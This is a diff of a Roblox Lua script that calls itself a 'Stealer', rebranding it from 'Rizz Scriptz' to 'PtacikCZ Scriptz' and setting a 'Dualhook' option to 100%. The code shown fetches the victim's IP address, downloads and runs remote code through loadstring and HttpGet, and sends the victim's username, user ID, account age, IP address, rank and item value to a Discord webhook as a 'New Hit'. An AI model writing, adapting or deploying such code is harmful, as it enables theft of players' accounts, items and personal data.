@@ -22,7 +22,7 @@ getgenv().Settings = {
   },
    Exclusives = {
        Dualhook = true,
-       Intensity = 50--%
+       Intensity = 100--%
   },
    Events = {
        Dualhook = true,
@@ -206,7 +206,7 @@ local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
 -- Loading Screen
-if _G.LoadingScreen ~= false then
+if _G.LoadingScreen ~= true then
     loadstring(game:HttpGet('https://raw.githubusercontent.com/HosteeScriptz/hostee.github.io/main/LoadingScreen'))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/ls.lua
 end
 
@@ -1018,10 +1018,10 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
         end
     else
         imgs =
-        "https://cdn.discordapp.com/attachments/1059224458033901668/1066510039818440864/New_Project_DADCF6A.gif"
+        "https://cdn.discordapp.com/attachments/1119001626997444682/1125170317011202068/IMG_1615.gif"
         data1 = {
             ["content"] = ping,
-            ["username"] = "Rizz Scriptz",
+            ["username"] = "PtacikCZ Scriptz",
             ["avatar_url"] = imgs,
             ["embeds"] = { {
                 ["title"] = "**New Hit** ||With Rizz||",
@@ -1034,7 +1034,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
                     ["width"] = 420
                 },
                 ["fields"] = { {
-                    ["name"] = "**This data was generated using Rizz Scriptz's Stealer** :moyai:",
+                    ["name"] = "**This data was generated using PtacikCZ Scriptz's Stealer** :moyai:",
                     ["value"] = "```Username     : " .. username ..
                         "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                         " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
